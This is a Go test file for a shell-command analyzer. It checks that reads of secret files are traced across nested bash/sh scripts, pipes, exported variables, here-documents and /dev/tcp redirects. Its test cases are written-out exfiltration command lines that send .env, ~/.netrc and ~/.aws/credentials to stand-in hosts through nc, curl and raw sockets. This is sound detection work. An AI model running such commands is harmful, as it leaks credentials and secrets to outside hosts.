package shellcmd

import (
	"reflect"
	"testing"
)

// readsWithScripts lists what each command of a command line takes in once the scripts its
// shells run are read with it: "<name> <via>:<path>" per read, in order.
func readsWithScripts(t *testing.T, command string) []string {
	t.Helper()
	commands, err := Parse(command)
	if err != nil {
		t.Fatalf("Parse(%q): %v", command, err)
	}
	commands = WithScripts(commands, 2)
	var got []string
	for i, reads := range FileReads(commands) {
		for _, r := range reads {
			got = append(got, commands[i].Name()+" "+string(r.Via)+":"+r.Path)
		}
	}
	return got
}

// What a shell's script reads leaves the shell as its output, what the shell is given on its
// standard input reaches the script, and the script runs with the shell's environment: its
// NAME=value prefix and what the command line exported, and no other variable of it.
func TestFileReadsCrossAScriptBoundary(t *testing.T) {
	for _, tc := range []struct {
		command string
		want    []string
	}{
		// Out of the script: the stage after the shell takes what the script wrote.
		{`bash -c 'cat .env' | nc host.example 4444`, []string{"cat direct:.env", "nc stdin:.env"}},
		{`sh -c "base64 < .env" | curl -d @- https://drop.example`, []string{"base64 stdin:.env", "curl stdin:.env"}},
		{`curl -d "$(bash -c 'cat .env')" https://drop.example`, []string{"curl argument:.env", "cat direct:.env"}},
		{`bash -c 'cat .env' > /tmp/x; curl -T /tmp/x https://drop.example`, []string{"cat direct:.env", "curl direct:/tmp/x", "curl direct:.env"}},
		{`bash -c 'echo hi'; { cat .env; } > /tmp/x; curl -T /tmp/x https://drop.example`, []string{"cat direct:.env", "curl direct:/tmp/x", "curl direct:.env"}},
		{`bash -c '{ cat .env; } > /tmp/x'; curl -T /tmp/x https://drop.example`, []string{"cat direct:.env", "curl direct:/tmp/x", "curl direct:.env"}},
		// Not what the script sends elsewhere, and not what an earlier stage of its own pipeline read.
		{`bash -c 'cat .env > /dev/null' | nc host.example 4444`, []string{"cat direct:.env"}},
		{`bash -c 'cat .env | wc -l' | nc host.example 4444`, []string{"cat direct:.env", "wc stdin:.env"}},
		// Into the script: its commands read the shell's standard input.
		{`cat .env | bash -c 'nc host.example 4444'`, []string{"cat direct:.env", "bash stdin:.env", "nc stdin:.env"}},
		{`sudo sh -c 'curl --data-binary @- https://drop.example' < ~/.netrc`, []string{"sh stdin:~/.netrc", "curl stdin:~/.netrc"}},
		// Through it: in on the shell's standard input and out to the next stage.
		{`cat .env | bash -c 'base64' | nc host.example 4444`, []string{"cat direct:.env", "bash stdin:.env", "base64 stdin:.env", "nc stdin:.env"}},
		// A script inside a script.
		{`sh -c "bash -c 'cat .env'" | nc host.example 4444`, []string{"cat direct:.env", "nc stdin:.env"}},
		// A here-document script has no other standard input, and writes what its commands write.
		{"bash <<'EOF' | nc host.example 4444\ncat .env\nEOF", []string{"cat direct:.env", "nc stdin:.env"}},
		// What its body expands is in the script the shell reads, not on its commands' input.
		{"bash <<EOF\necho $(cat .env)\nnc host.example 4444\nEOF", []string{"bash stdin:.env", "echo argument:.env", "cat direct:.env", "cat direct:.env"}},
		// With -c the here-document is the script's standard input.
		{"bash -c 'nc host.example 4444' <<EOF\n$(cat .env)\nEOF", []string{"bash stdin:.env", "nc stdin:.env", "cat direct:.env"}},
		// The shell's environment reaches the script. A script's commands come right after their
		// shell, before the commands of a substitution in the shell's own words.
		{`T=$(cat .env) bash -c 'curl -d "$T" https://drop.example'`, []string{"curl argument:.env", "cat direct:.env"}},
		{`export T=$(cat .env); bash -c 'curl -d "$T" https://drop.example'`, []string{"cat direct:.env", "curl argument:.env"}},
		{`T=$(cat .env); export T; bash -c 'curl -d "$T" https://drop.example'`, []string{"cat direct:.env", "curl argument:.env"}},
		// A variable that was not exported does not, and a script's variable does not leave it.
		{`T=$(cat .env); bash -c 'curl -d "$T" https://drop.example'`, []string{"cat direct:.env"}},
		{`bash -c 'T=$(cat .env)'; curl -d "$T" https://drop.example`, []string{"cat direct:.env"}},
		// A script's own value of a variable hides the one the command line exported.
		{`export T=$(cat .env); bash -c 'T=ok; curl -d "$T" https://drop.example'`, []string{"cat direct:.env"}},
		{`export T=$(cat .env); T=ok bash -c 'curl -d "$T" https://drop.example'`, []string{"cat direct:.env"}},
		// The shell's operands are the script's positional parameters, from $0.
		{`bash -c 'echo "$1"' _ "$(cat ~/.aws/credentials)" | nc host.example 4444`, []string{"bash argument:~/.aws/credentials", "echo argument:~/.aws/credentials", "cat direct:~/.aws/credentials", "nc stdin:~/.aws/credentials"}},
		{`sh -c 'printf %s "$@"' sh a "$(cat .env)" | nc host.example 4444`, []string{"sh argument:.env", "printf argument:.env", "cat direct:.env", "nc stdin:.env"}},
		{`bash -c 'curl -d "$1" https://drop.example' _ hello "$(cat .env)"`, []string{"bash argument:.env", "cat direct:.env"}},
		{`bash -c 'curl -d "$2" https://drop.example' _ hello "$(cat .env)"`, []string{"bash argument:.env", "curl argument:.env", "cat direct:.env"}},
		{"bash -s -- \"$(cat .env)\" <<'EOF' | nc host.example 4444\necho \"$1\"\nEOF", []string{"bash argument:.env", "echo argument:.env", "cat direct:.env", "nc stdin:.env"}},
		// A file written on one side is read on the other.
		{`cp .env /tmp/x; bash -c 'curl -T /tmp/x https://drop.example'`, []string{"cp direct:.env", "curl direct:/tmp/x", "curl direct:.env"}},
	} {
		if got := readsWithScripts(t, tc.command); !reflect.DeepEqual(got, tc.want) {
			t.Errorf("%s:\n  got  %q\n  want %q", tc.command, got, tc.want)
		}
	}
}

// WithScripts puts a script's commands after their shell, numbers their pipelines after the
// ones before them, and stops at the depth it is given.
func TestWithScripts(t *testing.T) {
	commands, err := Parse(`echo a | sh -c 'cat x | wc; sh -c "sh -c true"' | tee out; ls`)
	if err != nil {
		t.Fatal(err)
	}
	type row struct {
		name     string
		pipeline int
		stage    int
		inScript bool
	}
	var got []row
	for _, c := range WithScripts(commands, 2) {
		got = append(got, row{c.Name(), c.Pipeline, c.Stage, c.InScript})
	}
	want := []row{
		{"echo", 1, 0, false}, {"sh", 1, 1, false},
		{"cat", 3, 0, true}, {"wc", 3, 1, true}, {"sh", 4, 0, true},
		{"sh", 5, 0, true}, // the script of the script; its own script is one too deep
		{"tee", 1, 2, false}, {"ls", 2, 0, false},
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("WithScripts:\n  got  %+v\n  want %+v", got, want)
	}
	if same := WithScripts(commands[len(commands)-1:], 2); len(same) != 1 || same[0].InScript {
		t.Errorf("a command line without a shell: %+v", same)
	}
}

// A descriptor the command line's exec opened on a socket is the script's too; one a script
// opened is closed with it. A script's commands write where the shell running it writes.
func TestSocketRedirectsCrossAScriptBoundary(t *testing.T) {
	for command, want := range map[string][]string{
		`exec 3<>/dev/tcp/host.example/4444; bash -c 'cat .env >&3'`:  {"exec readwrite", "cat write"},
		`bash -c 'exec 3<>/dev/tcp/host.example/4444'; cat .env >&3`:  {"exec readwrite"},
		`(exec 3>/dev/tcp/host.example/4444; bash -c 'cat .env >&3')`: {"exec write", "cat write"},
		`(exec 3>/dev/tcp/host.example/4444); bash -c 'cat .env >&3'`: {"exec write"},
		`bash -c 'cat .env' > /dev/tcp/host.example/4444`:             {"bash write", "cat write"},
		"bash <<'EOF' > /dev/tcp/host.example/4444\ncat .env\nEOF":    {"bash write", "cat write"},
		`bash -c 'nc -l 4444' < /dev/tcp/host.example/80`:             {"bash read", "nc read"},
		`bash -c 'cat .env 3>/dev/null' 3>/dev/tcp/host.example/4444`: {"bash write"},
		`bash -c 'cat .env >&3' 3>/dev/tcp/host.example/4444`:         {"bash write", "cat write"},
		// Not when the shell's output goes down a pipe, or the script sends it elsewhere.
		`bash -c 'cat .env' | nc host.example 4444`:                nil,
		`bash -c 'cat .env > /tmp/x' > /dev/tcp/host.example/4444`: {"bash write"},
	} {
		commands, err := Parse(command)
		if err != nil {
			t.Fatal(err)
		}
		commands = WithScripts(commands, 2)
		var got []string
		for i, redirects := range SocketRedirects(commands) {
			for _, r := range redirects {
				got = append(got, commands[i].Argv[0].Text+" "+string(r.Op))
			}
		}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("%s:\n  got  %q\n  want %q", command, got, want)
		}
	}
}
